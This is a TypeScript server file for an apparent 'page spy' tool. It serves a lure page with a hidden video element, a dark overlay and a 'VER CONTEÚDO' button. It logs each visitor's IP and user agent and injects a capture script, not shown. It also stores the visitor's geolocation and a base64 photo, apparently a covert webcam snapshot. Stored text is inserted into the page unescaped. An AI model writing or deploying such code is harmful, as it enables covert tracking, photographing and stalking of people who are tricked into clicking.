import { zValidator } from "@hono/zod-validator";
import { Hono } from "hono";
import { raw } from "hono/html";
import { handle } from "hono/vercel";
import type { PageConfig } from "next";
import fs from "node:fs";
import { z } from "zod";
import { prismaClient } from "~/prisma/client";

export const config: PageConfig = {
  runtime: "nodejs",
};

const app = new Hono();

app.get("/", (c) => {
  return c.text("");
});

app.post(
  "/api/page-view-location",
  zValidator(
    "json",
    z.object({
      pageViewId: z.string(),
      latitude: z.string(),
      longitude: z.string(),
    }),
  ),
  async (c) => {
    const requestJson = await c.req.valid("json");

    const checkPageView = await prismaClient.pageSpyView.findUnique({
      where: {
        id: requestJson.pageViewId,
      },
      select: {
        location: true,
      },
    });

    if (checkPageView?.location) {
      return c.json({});
    }

    await prismaClient.pageSpyView.update({
      where: {
        id: requestJson.pageViewId,
      },
      data: {
        location: `${requestJson.latitude}, ${requestJson.longitude}`,
      },
    });

    return c.json({});
  },
);

app.post(
  "/api/page-view-photo",
  zValidator(
    "json",
    z.object({
      pageViewId: z.string(),
      photoBase64: z.string(),
    }),
  ),
  async (c) => {
    const requestJson = await c.req.valid("json");

    const checkPageView = await prismaClient.pageSpyView.findUnique({
      where: {
        id: requestJson.pageViewId,
      },
      select: {
        photoBase64: true,
      },
    });

    if (checkPageView?.photoBase64) {
      return c.json({});
    }

    await prismaClient.pageSpyView.update({
      where: {
        id: requestJson.pageViewId,
      },
      data: {
        photoBase64: requestJson.photoBase64,
      },
    });

    return c.json({});
  },
);

app.get("/*", async (c) => {
  const scriptCaptureDataString = fs.readFileSync("scripts/captureData.js", {
    encoding: "utf-8",
  });

  const path = c.req.path;

  const checkPageSpy = await prismaClient.pageSpy.findUnique({
    where: {
      path,
    },
    select: {
      id: true,
      type: true,
      textString: true,
      fileBase64: true,
    },
  });

  if (!checkPageSpy) {
    return c.text("Page not found", 404);
  }

  const requestIp = String(c.req.header("x-real-ip"));
  const requestUserAgent = String(c.req.header("user-agent"));

  const pageView = await prismaClient.pageSpyView.create({
    data: {
      ip: requestIp,
      userAgent: requestUserAgent,
      pageSpy: {
        connect: {
          path,
        },
      },
    },
    select: {
      id: true,
    },
  });

  let showContent = "";

  if (checkPageSpy.type === "TEXT") {
    showContent = `<p>${checkPageSpy.textString}</p>`;
  }

  if (checkPageSpy.type === "IMAGE") {
    showContent = `<img src="${checkPageSpy.fileBase64}" alt="File content" />`;
  }

  return c.html(`<!doctype html>
<html lang="en">
<head>
<style>
  #video {
    display: none;
  }

  #canvas {
    display: none;
  }

  #overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.91);
    display: flex;
    justify-content: center;
    align-items: center;
  }

  #captureButton {
    background-color: #2ecc71;
    font-size: 18px;
    padding: 10px 20px;
    cursor: pointer;
    color: white;
    border: none;
  }
</style>
</head>
<body>
  ${showContent}

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <div id="overlay">
    <button id="captureButton">VER CONTEÚDO</button>
  </div>

  <script>
    let pageLoadId = "${pageView.id}";
    ${raw(scriptCaptureDataString)};
  </script>
</body>
</html>`);
});

export const GET = handle(app);
export const POST = handle(app);
